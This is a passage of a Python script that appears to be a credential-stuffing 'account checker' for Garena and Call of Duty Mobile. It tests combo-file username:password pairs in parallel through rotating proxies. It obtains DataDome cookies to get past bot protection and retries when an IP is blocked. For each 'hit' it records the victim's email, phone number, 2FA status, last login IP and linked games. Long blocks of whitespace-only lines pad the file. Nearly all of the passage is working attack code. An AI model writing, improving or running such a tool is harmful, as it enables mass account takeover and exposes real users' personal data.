                        region = account_data.get('codm_region', 'N/A')
                        nickname = account_data.get('codm_nickname', 'N/A')
                        uid = account_data.get('codm_uid', account_data.get('uid', 'N/A'))
                        mobile = account_data.get('formatted_mobile', 'N/A')
                        email = account_data.get('email_display', 'N/A')
                        email_ver = "yes" if account_data.get('email_verified', False) else "no"
                        two_step = "Yes" if account_data.get('two_step_verify', False) else "No"
                        auth_app = "Yes" if account_data.get('authenticator_app', False) else "No"
                        country = account_data.get('country', 'N/A')
                        last_login = account_data.get('last_login_date', 'Unknown')
                        fb_link = account_data.get('fb_link', 'N/A')
                        fb_info = account_data.get('fb_info', 'NOT CONNECTED')
                        last_login_ip = account_data.get('last_login_ip', 'Unknown')
                        connected_games = account_data.get('game_connections', [])
                        game_list = []
                        for g in connected_games:
                            if isinstance(g, dict):
                                game_name = g.get('game', '')
                                if game_name:
                                    game_list.append(game_name)
                            elif isinstance(g, str):
                                game_list.append(g)
                        
                        formatted_hit = format_hit(
                            username=username,
                            password=password,
                            shell=shell,
                            level=codm_level,
                            region=region,
                            nickname=nickname,
                            uid=uid,
                            mobile=mobile,
                            email=email,
                            email_ver=email_ver,
                            two_step=two_step,
                            auth_app=auth_app,
                            country=country,
                            last_login=last_login,
                            is_clean=is_clean,
                            fb_link=fb_link,
                            fb_info=fb_info,
                            last_login_ip=last_login_ip,
                            has_codm=has_codm,
                            connected_games=game_list,
                            colorized=True
                        )
                        print(formatted_hit)
                    except Exception as e:
                        status_text = f"{GREEN}✓ Success (Clean){RESET}" if is_clean else f"{YELLOW}✓ Success (Not Clean){RESET}"
                        detail = f" – CODM Level {codm_level}" if has_codm else ""
                        print(f"   {CYAN}➤{RESET} {WHITE}{account}{RESET} → {status_text}{detail}")
                else:
                    err = "invalid"
                    print(f"   {CYAN}➤{RESET} {WHITE}{account}{RESET} → {RED}✗ Invalid – {err}{RESET}")
                
                print(f"   {GRAY}───────────────────────────────────────────────────────{RESET}")
                print(build_live_stats_ui(stats, 75))
            
            if proxy_manager and proxy_manager.is_loaded():
                proxy_manager.get_next()
            return (status, account, account_data or {})
        except Exception as e:
            return ('ERROR', account_line, {})

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
    
    def _wrapped_worker(account_line):
        with index_lock:
            account_index_counter[0] += 1
            my_index = account_index_counter[0]
        retry_count = 0
        acc_name = account_line.split(':', 1)[0].strip() if ':' in account_line else account_line
        while True:
            status, acc_name, account_data = _worker(account_line)
            if status == 'IP_CHANGED':
                if hasattr(_thread_local, 'session'):
                    try:
                        _thread_local.session.close()
                    except Exception:
                        pass
                    del _thread_local.session
                if hasattr(_thread_local, 'datadome'):
                    del _thread_local.datadome
                retry_count += 1
                time.sleep(2)
                continue
            break
        result_info = live_stats.pop_result()
        if result_info and result_info['success']:
            pass
        with stats_lock:
            pass
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                with stats_lock:
                    pass
    
    sys.stdout.write(f"\033[{GARENA_UI_HEIGHT}A\033[J")
    sys.stdout.flush()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
    
    stats = live_stats.get_stats()
    display_summary(
        stats.get('checked', 0),
        stats.get('invalid', 0) + stats.get('error', 0),
        stats.get('valid', 0),
        live_stats.categorized_levels,
        live_stats.countries,
        len(accounts),
        live_stats.highest_clean_level,
        live_stats.highest_nc_level,
        live_stats.highest_shell
    )
    
    results_manager.db_flush_final()
    _flush_auto_remove(file_manager, selected_file, force=True)
    print(f'  {GRAY}Results saved in real-time to Results/{RESET}')
    print()
    input(f'  {GRAY}[Press Enter to return to menu]{RESET} ')

# ============================================
# SINGLE CHECK (From cod.py - Modified UI)
# ============================================

def single_check():
    clear_screen()
    display_banner()
    
    w = _w(60)
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " SINGLE ACCOUNT CHECK "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{MAGENTA}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {GRAY}Enter credentials below{RESET}{' ' * 35}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    
    while True:
        live_stats = LiveStats()
        live_stats.total_accounts = 1
        session = requests.Session()
        
        valid_cookies = cookie_manager.get_valid_cookies()
        if valid_cookies:
            combined = '; '.join(valid_cookies)
            applyck(session, combined)
            dd_line = valid_cookies[-1]
            for part in dd_line.split(';'):
                part = part.strip()
                if part.startswith('datadome='):
                    datadome_manager.set_datadome(part.split('=', 1)[1].strip())
                    break
        else:
            proxy_dict = dict(session.proxies) if session.proxies else None
            datadome = get_datadome_cookie(session, proxies=proxy_dict)
            if datadome:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)
        
        account = input(f'  {CYAN}➤ Username/Email{RESET}  {CYAN}➤{RESET} ').strip()
        if not account:
            _log('ERROR', 'Username/Email cannot be empty.')
            print()
            continue
        
        password = input(f'  {CYAN}➤ Password{RESET}  {CYAN}➤{RESET} ').strip()
        if not password:
            _log('ERROR', 'Password cannot be empty.')
            print()
            continue

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        single_check_path = Path('SingleCheck')
        results_manager = ResultsManager(combo_file_path=single_check_path)
        import shutil
        default_results_folder = Path(f'Results/output_SingleCheck_{results_manager.timestamp}')
        if default_results_folder.exists():
            shutil.rmtree(default_results_folder)
        results_manager.base_dir = Path(f'Single Check Output/{timestamp}')
        for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
            (results_manager.base_dir / sub).mkdir(parents=True, exist_ok=True)
        
        _log('INFO', f'Checking: [bold]{account}[/bold]…')
        print()
        print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
        print(f"  {GRAY}║{RESET} {CYAN}Processing account...{RESET}{' ' * 35}{GRAY}║{RESET}")
        print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

        status, account_data = processaccount(
            session, account, password, cookie_manager, datadome_manager,
            live_stats, results_manager, file_manager=None, combo_file_path=None,
            auto_remove=False, use_elegant_display=True
        )
        
        save_response = input(f'\n  {YELLOW}➤ Save result? (y/n){RESET}  {YELLOW}➤{RESET} ').strip().lower()
        if save_response == 'y':
            _log('SAVE', f'Saved to [bold]{results_manager.base_dir}[/bold]')
        else:
            try:
                if results_manager.base_dir.exists():
                    shutil.rmtree(results_manager.base_dir)
                single_check_parent = Path('Single Check Output')
                if single_check_parent.exists() and (not any(single_check_parent.iterdir())):
                    single_check_parent.rmdir()
                default_results_folder = Path(f'Results/output_SingleCheck_{results_manager.timestamp}')
                if default_results_folder.exists():
                    shutil.rmtree(default_results_folder)
                results_folder = Path('Results')
                if results_folder.exists() and (not any(results_folder.iterdir())):
                    results_folder.rmdir()
                _log('INFO', 'Result discarded — not saved.')
            except Exception:
                _log('ERROR', 'Error cleaning up temporary files.')
        
        continue_response = input(f'\n  {MAGENTA}➤ Check another? (y/n){RESET}  {MAGENTA}➤{RESET} ').strip().lower()
        if continue_response != 'y':
            break
        session.close()
        _log('INFO', 'Refreshing session for next check…')
        time.sleep(1)
        clear_screen()
        display_banner()

# ============================================
# MAIN MENU (From cod.py - Modified UI)
# ============================================

def display_main_menu():
    w = _w(68)
    print(f"  {GRAY}╔{'═' * (w - 4)}╗{RESET}")
    title = " SELECT MODE "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {GRAY}║{CYAN}{title}{RESET}{' ' * title_pad}{GRAY}║{RESET}")
    print(f"  {GRAY}╠{'═' * (w - 4)}╣{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}  1{RESET}  {CYAN}›{RESET}  {WHITE}Bulk Check{RESET}    {GRAY}─ scan a combo file{RESET}{' ' * 20}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}  2{RESET}  {MAGENTA}›{RESET}  {WHITE}Single Check{RESET}  {GRAY}─ check one account{RESET}{' ' * 20}{GRAY}║{RESET}")
    print(f"  {GRAY}║{RESET} {WHITE}  3{RESET}  {YELLOW}›{RESET}  {WHITE}Validator{RESET}     {GRAY}─ login-only, no game data{RESET}{' ' * 15}{GRAY}║{RESET}")
    print(f"  {GRAY}╚{'═' * (w - 4)}╝{RESET}\n")
    
    while True:
        try:
            choice = input(f'  {CYAN}➤{RESET} ').strip()
            if choice in ('1', '2', '3'):
                return choice
            _log('ERROR', 'Enter 1, 2, or 3.')
        except KeyboardInterrupt:
            return '3'

# ============================================
# MAIN FUNCTION
# ============================================

def main():
    while True:
        clear_screen()
        display_banner()
        choice = display_main_menu()
        if choice == '1':
            bulk_check()
        elif choice == '2':
            single_check()
        elif choice == '3':
            validator_check()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {YELLOW}⚠  Script terminated by user.{RESET}\n')
    except Exception as e:
        import traceback
        print(f'\n  {RED}✖  Unexpected error: {e}{RESET}')
        traceback.print_exc()
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
             
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                                       